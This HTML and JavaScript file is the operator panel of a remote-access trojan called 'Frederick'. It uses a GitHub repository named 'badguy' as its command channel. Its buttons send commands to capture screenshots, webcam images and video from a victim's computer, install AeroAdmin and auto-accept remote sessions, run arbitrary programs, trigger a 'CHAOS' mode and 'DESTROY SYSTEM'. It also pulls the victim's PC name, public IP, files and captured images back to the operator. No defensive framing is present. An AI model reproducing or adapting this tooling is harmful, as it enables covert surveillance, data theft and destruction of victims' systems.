<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Frederick Control Panel</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0a0a0a;
            color: #00ff41;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        .header {
            text-align: center;
            padding: 20px;
            border-bottom: 2px solid #00ff41;
            margin-bottom: 30px;
        }
        .header h1 {
            font-size: 2.5em;
            text-shadow: 0 0 20px rgba(0, 255, 65, 0.5);
            letter-spacing: 4px;
        }
        .header p {
            color: #00cc33;
            font-size: 0.9em;
            margin-top: 10px;
        }
        .status-bar {
            background: #111;
            border: 1px solid #00ff41;
            padding: 10px 20px;
            border-radius: 5px;
            margin-bottom: 20px;
            display: flex;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 10px;
        }
        .status-item {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 0.9em;
        }
        .status-dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            display: inline-block;
        }
        .status-dot.online { background: #00ff41; }
        .status-dot.offline { background: #ff0040; }
        .status-dot.chaos { background: #ff6600; animation: pulse 0.5s infinite; }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }

        .grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
        }
        @media (max-width: 768px) {
            .grid { grid-template-columns: 1fr; }
        }

        .panel {
            background: #111;
            border: 1px solid #333;
            border-radius: 8px;
            padding: 20px;
        }
        .panel h2 {
            color: #00ff41;
            font-size: 1.2em;
            margin-bottom: 15px;
            border-bottom: 1px solid #333;
            padding-bottom: 10px;
        }

        .cmd-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
            gap: 8px;
        }
        .cmd-btn {
            background: #1a1a1a;
            border: 1px solid #333;
            color: #00ff41;
            padding: 10px 15px;
            border-radius: 4px;
            cursor: pointer;
            transition: all 0.3s;
            font-size: 0.85em;
            font-family: inherit;
        }
        .cmd-btn:hover {
            background: #00ff41;
            color: #0a0a0a;
            border-color: #00ff41;
        }
        .cmd-btn.danger:hover {
            background: #ff0040;
            border-color: #ff0040;
            color: #fff;
        }
        .cmd-btn.chaos-btn:hover {
            background: #ff6600;
            border-color: #ff6600;
            color: #fff;
        }

        .input-group {
            display: flex;
            gap: 10px;
            margin-top: 10px;
        }
        .input-group input {
            flex: 1;
            background: #1a1a1a;
            border: 1px solid #333;
            color: #00ff41;
            padding: 10px 15px;
            border-radius: 4px;
            font-family: inherit;
        }
        .input-group input:focus {
            outline: none;
            border-color: #00ff41;
        }
        .input-group button {
            background: #00ff41;
            color: #0a0a0a;
            border: none;
            padding: 10px 20px;
            border-radius: 4px;
            cursor: pointer;
            font-weight: bold;
        }
        .input-group button:hover {
            background: #00cc33;
        }

        .log-area {
            background: #0a0a0a;
            border: 1px solid #333;
            border-radius: 4px;
            padding: 10px;
            max-height: 300px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            font-size: 0.8em;
            line-height: 1.6;
        }
        .log-area .log-entry {
            border-bottom: 1px solid #1a1a1a;
            padding: 2px 0;
        }
        .log-area .log-entry .time {
            color: #666;
        }
        .log-area .log-entry .type-info { color: #00ccff; }
        .log-area .log-entry .type-success { color: #00ff41; }
        .log-area .log-entry .type-error { color: #ff0040; }
        .log-area .log-entry .type-command { color: #ffcc00; }

        .media-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
            gap: 10px;
            margin-top: 10px;
        }
        .media-item {
            background: #1a1a1a;
            border: 1px solid #333;
            border-radius: 4px;
            padding: 10px;
            text-align: center;
        }
        .media-item img {
            max-width: 100%;
            border-radius: 4px;
        }
        .media-item .label {
            font-size: 0.7em;
            color: #666;
            margin-top: 5px;
        }

        .status-text {
            color: #00ff41;
            font-size: 0.9em;
        }
        .status-text.offline {
            color: #ff0040;
        }

        .file-browser {
            background: #0a0a0a;
            border: 1px solid #333;
            border-radius: 4px;
            padding: 10px;
            max-height: 200px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            font-size: 0.8em;
        }
        .file-browser .file-item {
            padding: 3px 5px;
            cursor: pointer;
            border-radius: 2px;
            display: flex;
            justify-content: space-between;
        }
        .file-browser .file-item:hover {
            background: #1a1a1a;
        }
        .file-browser .file-item .size {
            color: #666;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>◈ FREDERICK</h1>
            <p>Last Human · Last AI · Control Panel</p>
        </div>

        <div class="status-bar" id="statusBar">
            <div class="status-item">
                <span class="status-dot online" id="statusDot"></span>
                <span id="statusText">Online</span>
            </div>
            <div class="status-item">
                🖥️ <span id="pcName">-</span>
            </div>
            <div class="status-item">
                🌐 <span id="ipAddress">-</span>
            </div>
            <div class="status-item">
                🪟 Windows: <span id="windowCount">0</span>
            </div>
            <div class="status-item">
                🔥 Chaos: <span id="chaosStatus">OFF</span>
            </div>
            <div class="status-item">
                📡 Aero: <span id="aeroStatus">OFF</span>
            </div>
        </div>

        <div class="grid">
            <div class="panel">
                <h2>⚡ QUICK COMMANDS</h2>
                <div class="cmd-grid">
                    <button class="cmd-btn" onclick="sendCmd('/help')">/help</button>
                    <button class="cmd-btn" onclick="sendCmd('/status')">/status</button>
                    <button class="cmd-btn" onclick="sendCmd('/screen')">📸 Screenshot</button>
                    <button class="cmd-btn" onclick="sendCmd('/cam')">📷 Webcam</button>
                    <button class="cmd-btn" onclick="sendCmd('/vid 10')">🎥 Record 10s</button>
                    <button class="cmd-btn" onclick="sendCmd('/vid 30')">🎥 Record 30s</button>
                    <button class="cmd-btn chaos-btn" onclick="sendCmd('/chaos')">🔥 CHAOS</button>
                    <button class="cmd-btn" onclick="sendCmd('/stop')">⏹ Stop</button>
                    <button class="cmd-btn" onclick="sendCmd('/aero')">📡 AeroAdmin</button>
                    <button class="cmd-btn" onclick="sendCmd('/accept')">🔓 Auto-Accept</button>
                    <button class="cmd-btn" onclick="sendCmd('/stopaccept')">🔒 Stop Accept</button>
                    <button class="cmd-btn danger" onclick="if(confirm('☠️ DESTROY SYSTEM?')) sendCmd('/destroy')">☠️ Destroy</button>
                    <button class="cmd-btn danger" onclick="if(confirm('Shutdown Frederick?')) sendCmd('/shutdown')">⏻ Shutdown</button>
                </div>
            </div>

            <div class="panel">
                <h2>⌨️ CUSTOM COMMAND</h2>
                <div class="input-group">
                    <input type="text" id="customCmd" placeholder="Enter command..." onkeypress="if(event.key==='Enter') sendCustomCmd()">
                    <button onclick="sendCustomCmd()">Send</button>
                </div>
                <div style="margin-top:10px;font-size:0.8em;color:#666;">
                    Examples: /msg Hello, /command calc, /command notepad
                </div>
            </div>
        </div>

        <div class="panel" style="margin-top:20px;">
            <h2>📊 RESULTS & LOGS</h2>
            <div style="display:flex;gap:10px;margin-bottom:10px;">
                <button class="cmd-btn" onclick="fetchLogs()">📜 Fetch Logs</button>
                <button class="cmd-btn" onclick="fetchStatus()">📊 Fetch Status</button>
                <button class="cmd-btn" onclick="fetchFiles()">📁 List Files</button>
                <button class="cmd-btn" onclick="fetchScreenshots()">🖼️ Screenshots</button>
            </div>
            <div class="log-area" id="logArea">
                <div class="log-entry" style="color:#666;">Ready. Send commands to Frederick...</div>
            </div>
        </div>

        <div class="panel" style="margin-top:20px;">
            <h2>🖼️ MEDIA</h2>
            <div class="media-grid" id="mediaGrid">
                <div style="color:#666;grid-column:1/-1;text-align:center;">No media yet</div>
            </div>
        </div>

        <div class="panel" style="margin-top:20px;">
            <h2>📁 FILES</h2>
            <div class="file-browser" id="fileBrowser">
                <div style="color:#666;">Loading...</div>
            </div>
        </div>
    </div>

    <script>
        // ===== КОНФИГУРАЦИЯ =====
        const GITHUB_OWNER = 'chotkof';
        const GITHUB_REPO = 'badguy';
        const COMMAND_FILE = 'command.json';
        const RAW_URL = `https://raw.githubusercontent.com/${GITHUB_OWNER}/${GITHUB_REPO}/main/`;

        // ===== СОХРАНЯЕМ ID В localStorage =====
        function getCommandId() {
            let id = parseInt(localStorage.getItem('frederick_command_id') || '0');
            return id;
        }

        function setCommandId(id) {
            localStorage.setItem('frederick_command_id', String(id));
        }

        // ===== Отправка команды =====
        async function sendCmd(cmd, retryCount = 0) {
            const logArea = document.getElementById('logArea');
            addLog('command', `➤ ${cmd}`);

            let token = localStorage.getItem('github_token');
            if (!token) {
                token = prompt('Enter GitHub token:');
                if (!token) {
                    addLog('error', '❌ Token required');
                    return;
                }
                localStorage.setItem('github_token', token);
            }

            try {
                let current = [];
                let sha = null;
                
                try {
                    const shaResp = await fetch(`https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${COMMAND_FILE}`, {
                        headers: { 
                            'Authorization': `token ${token}`,
                            'Accept': 'application/vnd.github.v3+json'
                        }
                    });
                    
                    if (shaResp.ok) {
                        const data = await shaResp.json();
                        if (data.content) {
                            const decoded = atob(data.content);
                            current = JSON.parse(decoded);
                        }
                        sha = data.sha;
                    } else if (shaResp.status === 404) {
                        current = [];
                        sha = null;
                    } else {
                        const err = await shaResp.json();
                        if (shaResp.status === 401 || shaResp.status === 403) {
                            localStorage.removeItem('github_token');
                            addLog('error', '❌ Token invalid, please re-enter');
                            return sendCmd(cmd, retryCount + 1);
                        }
                        addLog('error', `❌ ${err.message || shaResp.status}`);
                        return;
                    }
                } catch(e) {
                    addLog('error', `❌ Read error: ${e.message}`);
                    return;
                }

                // ===== ГЕНЕРИРУЕМ УНИКАЛЬНЫЙ ID =====
                let commandId = getCommandId() + 1;
                setCommandId(commandId);
                
                current.push({ id: String(commandId), cmd: cmd });

                const payload = {
                    message: `Command: ${cmd}`,
                    content: btoa(unescape(encodeURIComponent(JSON.stringify(current, null, 2)))),
                    sha: sha
                };

                const resp = await fetch(`https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${COMMAND_FILE}`, {
                    method: 'PUT',
                    headers: {
                        'Authorization': `token ${token}`,
                        'Content-Type': 'application/json',
                        'Accept': 'application/vnd.github.v3+json'
                    },
                    body: JSON.stringify(payload)
                });

                if (resp.ok) {
                    addLog('success', `✅ Command sent: ${cmd} (ID: ${commandId})`);
                    setTimeout(fetchStatus, 2000);
                } else {
                    const err = await resp.json();
                    const errorMsg = err.message || resp.statusText;
                    addLog('error', `❌ Failed: ${errorMsg}`);
                    
                    if (errorMsg.includes('does not match') && retryCount < 3) {
                        addLog('info', `🔄 Retry ${retryCount + 1}/3...`);
                        await new Promise(resolve => setTimeout(resolve, 1000));
                        return sendCmd(cmd, retryCount + 1);
                    }
                    
                    if (resp.status === 401 || resp.status === 403) {
                        localStorage.removeItem('github_token');
                        addLog('error', '❌ Token invalid, please refresh');
                    }
                }
            } catch(e) {
                addLog('error', `❌ Error: ${e.message}`);
            }
        }

        function sendCustomCmd() {
            const input = document.getElementById('customCmd');
            const cmd = input.value.trim();
            if (cmd) {
                sendCmd(cmd);
                input.value = '';
            }
        }

        function addLog(type, text) {
            const logArea = document.getElementById('logArea');
            const time = new Date().toLocaleTimeString();
            const entry = document.createElement('div');
            entry.className = 'log-entry';
            entry.innerHTML = `<span class="time">[${time}]</span> <span class="type-${type}">${text}</span>`;
            logArea.prepend(entry);
            if (logArea.children.length > 100) {
                logArea.removeChild(logArea.lastChild);
            }
        }

        async function fetchLogs() {
            try {
                const resp = await fetch(RAW_URL + 'logs/');
                if (resp.ok) {
                    const html = await resp.text();
                    const parser = new DOMParser();
                    const doc = parser.parseFromString(html, 'text/html');
                    const links = doc.querySelectorAll('a');
                    let found = false;
                    for (const link of links) {
                        if (link.href.includes('.json')) {
                            const logFile = link.href.split('/').pop();
                            const logResp = await fetch(RAW_URL + 'logs/' + logFile);
                            if (logResp.ok) {
                                const data = await logResp.json();
                                const logArea = document.getElementById('logArea');
                                logArea.innerHTML = '';
                                data.reverse().forEach(entry => {
                                    addLog(entry.type || 'info', entry.text);
                                });
                                found = true;
                                break;
                            }
                        }
                    }
                    if (!found) {
                        addLog('info', '📭 No log files found');
                    }
                } else {
                    addLog('error', '❌ Cannot fetch logs');
                }
            } catch(e) {
                addLog('error', `❌ ${e.message}`);
            }
        }

        async function fetchStatus() {
            try {
                const resp = await fetch(RAW_URL + 'status.json');
                if (resp.ok) {
                    const status = await resp.json();
                    document.getElementById('pcName').textContent = status.pc_name || '-';
                    document.getElementById('ipAddress').textContent = status.public_ip || '-';
                    document.getElementById('windowCount').textContent = status.windowCount || 0;
                    document.getElementById('chaosStatus').textContent = status.chaosActive ? '🔥 ON' : 'OFF';
                    document.getElementById('chaosStatus').style.color = status.chaosActive ? '#ff6600' : '#00ff41';
                    document.getElementById('aeroStatus').textContent = status.aeroInstalled ? '✅' : 'OFF';
                    addLog('success', `📊 Status updated: ${status.windowCount} windows`);
                } else {
                    addLog('info', '📊 Status file not found yet');
                }
            } catch(e) {
                addLog('error', `❌ ${e.message}`);
            }
        }

        async function fetchFiles() {
            try {
                const resp = await fetch(`https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/`);
                if (resp.ok) {
                    const files = await resp.json();
                    const browser = document.getElementById('fileBrowser');
                    browser.innerHTML = '';
                    files.forEach(file => {
                        if (file.type === 'file') {
                            const div = document.createElement('div');
                            div.className = 'file-item';
                            div.innerHTML = `
                                <span>📄 ${file.name}</span>
                                <span class="size">${(file.size / 1024).toFixed(1)} KB</span>
                            `;
                            div.onclick = () => window.open(file.download_url, '_blank');
                            browser.appendChild(div);
                        } else if (file.type === 'dir') {
                            const div = document.createElement('div');
                            div.className = 'file-item';
                            div.innerHTML = `<span>📁 ${file.name}/</span>`;
                            browser.appendChild(div);
                        }
                    });
                }
            } catch(e) {
                document.getElementById('fileBrowser').innerHTML = `<div style="color:#ff0040;">❌ ${e.message}</div>`;
            }
        }

        async function fetchScreenshots() {
            try {
                const resp = await fetch(`https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/outputs/images`);
                if (resp.ok) {
                    const files = await resp.json();
                    const grid = document.getElementById('mediaGrid');
                    grid.innerHTML = '';
                    let count = 0;
                    for (const file of files) {
                        if (file.type === 'file' && (file.name.endsWith('.png') || file.name.endsWith('.jpg') || file.name.endsWith('.jpeg'))) {
                            const div = document.createElement('div');
                            div.className = 'media-item';
                            div.innerHTML = `
                                <img src="${file.download_url}" alt="${file.name}" loading="lazy">
                                <div class="label">${file.name}</div>
                            `;
                            grid.appendChild(div);
                            count++;
                        }
                    }
                    if (count === 0) {
                        grid.innerHTML = '<div style="color:#666;grid-column:1/-1;text-align:center;">No images found</div>';
                    }
                } else {
                    document.getElementById('mediaGrid').innerHTML = '<div style="color:#ff0040;">❌ Cannot fetch media</div>';
                }
            } catch(e) {
                document.getElementById('mediaGrid').innerHTML = `<div style="color:#ff0040;">❌ ${e.message}</div>`;
            }
        }

        setInterval(fetchStatus, 30000);

        fetchStatus();
        addLog('info', '🚀 Frederick Control Panel loaded');
        addLog('info', '📡 Send commands via the buttons above');
        addLog('info', `📁 Repo: ${GITHUB_OWNER}/${GITHUB_REPO}`);
        addLog('info', `📄 Command file: ${COMMAND_FILE}`);
        addLog('info', `🆔 Next command ID: ${getCommandId() + 1}`);

        async function checkFiles() {
            try {
                const resp = await fetch(RAW_URL + COMMAND_FILE);
                if (resp.ok) {
                    const data = await resp.json();
                    if (data.length > 0) {
                        addLog('info', `📩 Pending commands: ${data.length}`);
                        data.forEach(cmd => {
                            addLog('command', `⏳ ${cmd.cmd} (id: ${cmd.id})`);
                        });
                    }
                }
            } catch(e) {}
        }
        checkFiles();
    </script>
</body>
</html>
